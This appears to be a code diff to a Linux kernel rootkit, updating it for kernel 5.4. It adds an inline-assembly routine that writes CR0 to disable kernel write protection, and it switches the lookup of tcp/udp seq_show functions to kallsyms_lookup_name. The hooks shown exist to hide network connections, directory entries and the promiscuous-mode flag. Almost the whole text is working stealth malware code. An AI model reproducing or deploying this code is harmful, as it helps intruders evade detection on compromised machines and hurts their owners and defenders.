@@ -51,17 +51,24 @@ struct sym_hook
 // list for hooked func
 LIST_HEAD(hooked_syms);
 
+// can not use write_cr0() in Linux 5.4.0-52
+inline void mywrite_cr0(unsigned long cr0)
+{
+    asm volatile(" mov %0,%%cr0"
+                 : "+r"(cr0), "+m"(__force_order));
+}
+
 inline unsigned long disable_wp(void)
 {
     unsigned long cr0;
     cr0 = read_cr0();
-    write_cr0(cr0 & ~X86_CR0_WP);
+    mywrite_cr0(cr0 & ~X86_CR0_WP);
     return cr0;
 }
 
 inline void enable_wp(unsigned long cr0)
 {
-    write_cr0(cr0);
+    mywrite_cr0(cr0);
 }
 
 void hook_start(void *target, void *trampoline)
@@ -386,26 +393,26 @@ char *strnstr(const char *haystack, const char *needle, size_t n)
         return NULL;
 }
 
-void *get_tcp_seq_show(const char *path)
-{
-    void *ret;
-    struct file *filep;
-    struct tcp_seq_afinfo *afinfo;
+// void *get_tcp_seq_show(const char *path)
+// {
+//     void *ret;
+//     struct file *filep;
+//     struct tcp_seq_afinfo *afinfo;
 
-    if ((filep = filp_open(path, O_RDONLY, 0)) == NULL)
-    {
-        DEBUG("Failed to open file: %s", path);
-        return NULL;
-    }
+//     if ((filep = filp_open(path, O_RDONLY, 0)) == NULL)
+//     {
+//         DEBUG("Failed to open file: %s", path);
+//         return NULL;
+//     }
 
-    afinfo = PDE_DATA(filep->f_path.dentry->d_inode);
+//     afinfo = PDE_DATA(filep->f_path.dentry->d_inode);
 
-    ret = afinfo->seq_ops.show;
+//     ret = afinfo->seq_ops.show;
 
-    filp_close(filep, 0);
+//     filp_close(filep, 0);
 
-    return ret;
-}
+//     return ret;
+// }
 
 static int new_tcp4_seq_show(struct seq_file *seq, void *v)
 {
@@ -455,26 +462,26 @@ static int new_tcp6_seq_show(struct seq_file *seq, void *v)
     return ret;
 }
 
-void *get_udp_seq_show(const char *path)
-{
-    void *ret;
-    struct file *filep;
-    struct udp_seq_afinfo *afinfo;
+// void *get_udp_seq_show(const char *path)
+// {
+//     void *ret;
+//     struct file *filep;
+//     struct udp_seq_afinfo *afinfo;
 
-    if ((filep = filp_open(path, O_RDONLY, 0)) == NULL)
-    {
-        DEBUG("Failed to open file: %s", path);
-        return NULL;
-    }
+//     if ((filep = filp_open(path, O_RDONLY, 0)) == NULL)
+//     {
+//         DEBUG("Failed to open file: %s", path);
+//         return NULL;
+//     }
 
-    afinfo = PDE_DATA(filep->f_path.dentry->d_inode);
+//     afinfo = PDE_DATA(filep->f_path.dentry->d_inode);
 
-    ret = afinfo->seq_ops.show;
+//     ret = afinfo->seq_ops.show;
 
-    filp_close(filep, 0);
+//     filp_close(filep, 0);
 
-    return ret;
-}
+//     return ret;
+// }
 
 static int new_udp4_seq_show(struct seq_file *seq, void *v)
 {
@@ -977,7 +984,6 @@ static int new_inet_ioctl(struct socket *sock, unsigned int cmd, unsigned long a
 // extern int parport_pc_init(void);
 // extern void parport_pc_exit(void);
 
-
 int __init init_rootkit(void)
 {
     DEBUG("begin the init function\n");
@@ -996,19 +1002,23 @@ int __init init_rootkit(void)
     hook_start(root_iterate, &new_root_iterate);
 
     // Hook /proc/net/tcp for hiding tcp4 connections
-    tcp4_seq_show = get_tcp_seq_show("/proc/net/tcp");
+    // tcp4_seq_show = get_tcp_seq_show("/proc/net/tcp");
+    tcp4_seq_show = (void*)kallsyms_lookup_name("tcp4_seq_show");
     hook_start(tcp4_seq_show, &new_tcp4_seq_show);
 
     // Hook /proc/net/tcp6 for hiding tcp6 connections
-    tcp6_seq_show = get_tcp_seq_show("/proc/net/tcp6");
+    // tcp6_seq_show = get_tcp_seq_show("/proc/net/tcp6");
+    tcp6_seq_show = (void*)kallsyms_lookup_name("tcp6_seq_show");
     hook_start(tcp6_seq_show, &new_tcp6_seq_show);
 
     // Hook /proc/net/udp for hiding udp4 connections
-    udp4_seq_show = get_udp_seq_show("/proc/net/udp");
+    // udp4_seq_show = get_udp_seq_show("/proc/net/udp");
+    udp4_seq_show = (void*)kallsyms_lookup_name("udp4_seq_show");
     hook_start(udp4_seq_show, &new_udp4_seq_show);
 
     // Hook /proc/net/udp6 for hiding udp4 connections
-    udp6_seq_show = get_udp_seq_show("/proc/net/udp6");
+    // udp6_seq_show = get_udp_seq_show("/proc/net/udp6");
+    udp6_seq_show = (void*)kallsyms_lookup_name("udp6_seq_show");
     hook_start(udp6_seq_show, &new_udp6_seq_show);
 
     // Hook dev_get_flags() for PROMISC flag hiding
